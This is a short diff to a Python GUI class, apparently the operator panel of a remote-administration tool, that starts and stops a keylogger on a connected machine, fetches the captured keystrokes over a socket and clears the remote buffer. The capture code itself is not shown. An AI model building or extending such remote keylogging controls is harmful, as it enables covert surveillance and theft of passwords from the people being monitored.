@@ -40,12 +40,12 @@ class keylogger_view:
         self.show_message("Keylogger started!")
                 
     def btn_stop_keylogger_click(self):
-        keys_to_stop = self.controller.stop_keylogger(self.client_socket)
-        self.update_text_widget("\n".join(keys_to_stop))
-        self.show_message("Keylogger stopped and keys fetched.")       
+        self.controller.stop_keylogger(self.client_socket)
+        self.btn_print_keylogger_click()
+        self.show_message("Keys fetched and Keylogger stopped.")       
     
     def btn_print_keylogger_click(self):
-        self.clear_text_widget()
+        self.text_bat_keylogger.delete("1.0", "end")
         keys_from_server = self.controller.print_keylogger(self.client_socket)
         self.update_text_widget(keys_from_server)
 
@@ -53,10 +53,14 @@ class keylogger_view:
         self.clear_text_widget()
         self.show_message("Text widget cleared.")
     
-    def update_text_widget(self, text):
+    def update_text_widget(self, text):        
+        # Kiểm tra và xóa chuỗi "Unknown Command" nếu có       
+        if "Unknown command." in text:
+            text = text.replace("Unknown command.", "") 
         self.text_bat_keylogger.insert("end", text)
 
     def clear_text_widget(self):
+        self.controller.clear_buffer_keylogger(self.client_socket)
         self.text_bat_keylogger.delete("1.0", "end")  # Xóa từ dòng đầu tiên đến cuối cùng
 
     def show_message(self, message):
